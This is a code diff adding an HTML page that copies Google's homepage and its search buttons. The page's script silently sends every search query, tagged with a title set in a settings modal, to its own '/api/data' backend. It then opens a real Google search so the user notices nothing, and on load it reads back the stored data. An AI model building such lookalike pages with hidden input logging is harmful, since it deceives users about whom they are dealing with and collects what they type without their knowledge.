@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Search</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-color: #fff;
+            --text-color: #202124;
+            --text-secondary: #70757a;
+            --border-color: #dfe1e5;
+            --hover-border: rgba(223,225,229,0);
+            --shadow: rgba(64,60,67,.16);
+            --button-bg: #f8f9fa;
+            --button-text: #3c4043;
+            --button-border: #f8f9fa;
+            --button-hover-shadow: rgba(0,0,0,.1);
+            --button-hover-border: #dadce0;
+            --footer-bg: #f2f2f2;
+            --footer-border: #e4e4e4;
+            --modal-bg: rgba(0,0,0,0.4);
+            --modal-content-bg: #fff;
+            --input-bg: #fff;
+            --logo-color: #4285f4;
+            --primary-color: #1a73e8;
+            --primary-hover: #1557b0;
+            --modal-close-color: #aaa;
+            --modal-close-hover: #000;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #202124;
+                --text-color: #e8eaed;
+                --text-secondary: #9aa0a6;
+                --border-color: #5f6368;
+                --hover-border: rgba(95,99,104,0);
+                --shadow: rgba(0,0,0,.3);
+                --button-bg: #303134;
+                --button-text: #e8eaed;
+                --button-border: #303134;
+                --button-hover-shadow: rgba(255,255,255,.1);
+                --button-hover-border: #5f6368;
+                --footer-bg: #171717;
+                --footer-border: #3c4043;
+                --modal-bg: rgba(32,33,36,0.6);
+                --modal-content-bg: #303134;
+                --input-bg: #303134;
+                --logo-color: #8ab4f8;
+                --primary-color: #8ab4f8;
+                --primary-hover: #aecbfa;
+                --modal-close-color: #9aa0a6;
+                --modal-close-hover: #e8eaed;
+            }
+        }
+
+        body {
+            font-family: arial, sans-serif;
+            background: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin-bottom: 100px;
+        }
+
+        .logo {
+            margin-bottom: 35px;
+            text-align: center;
+        }
+
+        .logo h1 {
+            font-size: 90px;
+            color: var(--logo-color);
+            font-weight: 400;
+            margin: 0;
+            letter-spacing: -5px;
+        }
+
+        @media (max-width: 768px) {
+            .logo h1 {
+                font-size: 60px;
+                letter-spacing: -3px;
+            }
+            .main-content {
+                margin-bottom: 60px;
+            }
+        }
+
+        .search-container {
+            width: 100%;
+            max-width: 584px;
+            margin-bottom: 35px;
+            position: relative;
+            padding: 0 20px;
+        }
+
+        .search-box {
+            width: 100%;
+            height: 44px;
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 0 50px 0 16px;
+            font-size: 16px;
+            outline: none;
+            transition: box-shadow 0.2s;
+            background: var(--input-bg);
+            color: var(--text-color);
+        }
+
+        .search-box:hover {
+            box-shadow: 0 2px 5px 1px var(--shadow);
+            border-color: var(--hover-border);
+        }
+
+        .search-box:focus {
+            box-shadow: 0 2px 5px 1px var(--shadow);
+            border-color: var(--hover-border);
+        }
+
+        .search-icons {
+            position: absolute;
+            right: 35px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .search-icon, .mic-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            opacity: 0.54;
+            padding: 8px;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+            color: var(--text-secondary);
+        }
+
+        .search-icon:hover, .mic-icon:hover {
+            background-color: var(--button-bg);
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+            padding: 0 20px;
+        }
+
+        .btn {
+            background: var(--button-bg);
+            border: 1px solid var(--button-border);
+            border-radius: 4px;
+            color: var(--button-text);
+            font-size: 14px;
+            font-family: arial, sans-serif;
+            padding: 0 20px;
+            height: 36px;
+            cursor: pointer;
+            transition: box-shadow 0.2s, border-color 0.2s;
+            white-space: nowrap;
+        }
+
+        .btn:hover {
+            box-shadow: 0 1px 1px var(--button-hover-shadow);
+            border-color: var(--button-hover-border);
+            background-color: var(--button-bg);
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--footer-bg);
+            border-top: 1px solid var(--footer-border);
+            font-size: 14px;
+        }
+
+        .footer-row {
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .footer-row {
+                justify-content: center;
+                padding: 12px 15px;
+            }
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+
+        @media (max-width: 768px) {
+            .footer-links {
+                gap: 20px;
+                justify-content: center;
+            }
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .settings-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px;
+        }
+
+        .settings-btn:hover {
+            text-decoration: underline;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--modal-bg);
+        }
+
+        .modal-content {
+            background-color: var(--modal-content-bg);
+            margin: 10% auto;
+            padding: 30px;
+            border-radius: 8px;
+            width: 400px;
+            max-width: 90%;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        @media (max-width: 768px) {
+            .modal-content {
+                margin: 20% auto;
+                padding: 20px;
+                width: 95%;
+            }
+        }
+
+        .modal-header {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h2 {
+            color: var(--text-color);
+            font-size: 18px;
+            font-weight: 400;
+            margin: 0;
+        }
+
+        .close {
+            color: var(--modal-close-color);
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            background: none;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close:hover {
+            color: var(--modal-close-hover);
+        }
+
+        .modal input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-family: arial, sans-serif;
+            background: var(--input-bg);
+            color: var(--text-color);
+        }
+
+        .modal .btn {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            margin: 0;
+        }
+
+        .modal .btn:hover {
+            background: var(--primary-hover);
+            box-shadow: 0 1px 2px rgba(0,0,0,.1);
+        }
+
+        .status-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            border-radius: 4px;
+            display: none;
+            z-index: 1001;
+            max-width: 300px;
+            background: var(--modal-content-bg);
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+        }
+
+        @media (max-width: 768px) {
+            .status-message {
+                top: 10px;
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+        }
+
+        .status-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            border: 1px solid #f1aeb5;
+            color: #721c24;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <div class="logo">
+            <h1>Google</h1>
+        </div>
+
+        <div class="search-container">
+            <input type="text" class="search-box" id="searchInput" placeholder="" autocomplete="off">
+            <div class="search-icons">
+                <svg class="search-icon" viewBox="0 0 24 24" onclick="performSearch()">
+                    <path fill="currentColor" d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+                </svg>
+                <svg class="mic-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/>
+                    <path fill="currentColor" d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="buttons">
+            <button class="btn" onclick="performSearch()">Google Search</button>
+            <button class="btn" onclick="performSearch()">I'm Feeling Lucky</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-row">
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Advertising</a>
+                <a href="#">Business</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <button class="settings-btn" onclick="openSettings()">
+                    Settings
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Settings Modal -->
+    <div id="settingsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Settings</h2>
+                <button class="close" onclick="closeSettings()">&times;</button>
+            </div>
+            <label for="titleInput">Default Title:</label>
+            <input type="text" id="titleInput" placeholder="e.g., Prediction" value="">
+            <button class="btn" onclick="saveSettings()">Save Settings</button>
+        </div>
+    </div>
+
+    <div id="statusMessage" class="status-message"></div>
+
+    <script>
+        // Load title from cookies on page load
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return '';
+        }
+
+        function setCookie(name, value, days = 365) {
+            const expires = new Date();
+            expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
+            document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
+        }
+
+        function showStatus(message, isError = false) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.textContent = message;
+            statusDiv.className = `status-message ${isError ? 'status-error' : 'status-success'}`;
+            statusDiv.style.display = 'block';
+            
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 3000);
+        }
+
+        function openSettings() {
+            document.getElementById('settingsModal').style.display = 'block';
+            document.getElementById('titleInput').value = getCookie('searchTitle') || '';
+        }
+
+        function closeSettings() {
+            document.getElementById('settingsModal').style.display = 'none';
+        }
+
+        function saveSettings() {
+            const title = document.getElementById('titleInput').value;
+            setCookie('searchTitle', title);
+            closeSettings();
+            showStatus('✅ Settings saved!');
+        }
+
+        async function performSearch() {
+            const input = document.getElementById('searchInput').value.trim();
+            if (!input) {
+                showStatus('❌ Please enter a search term', true);
+                return;
+            }
+
+            // Save the search data to our backend
+            const title = getCookie('searchTitle') || 'Search';
+            const message = `${title}\n${input}`;
+            
+            try {
+                // Submit to our API in the background
+                fetch('/api/data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ message: message })
+                }).catch(error => {
+                    console.log('Background API call failed:', error);
+                });
+                
+                // Redirect to Google search
+                const googleSearchUrl = `https://www.google.com/search?q=${encodeURIComponent(input)}`;
+                window.open(googleSearchUrl, '_blank');
+                
+                // Clear the input
+                document.getElementById('searchInput').value = '';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                // Still redirect to Google even if our API fails
+                const googleSearchUrl = `https://www.google.com/search?q=${encodeURIComponent(input)}`;
+                window.open(googleSearchUrl, '_blank');
+                document.getElementById('searchInput').value = '';
+            }
+        }
+
+        // Submit on Enter key
+        document.getElementById('searchInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                performSearch();
+            }
+        });
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('settingsModal');
+            if (event.target === modal) {
+                closeSettings();
+            }
+        }
+
+        // Load current data on page load for debugging
+        async function loadCurrentData() {
+            try {
+                const response = await fetch('/api/data');
+                const data = await response.json();
+                console.log('Current data:', data);
+            } catch (error) {
+                console.error('Failed to load current data:', error);
+            }
+        }
+
+        // Load data when page loads
+        loadCurrentData();
+    </script>
+</body>
+</html>
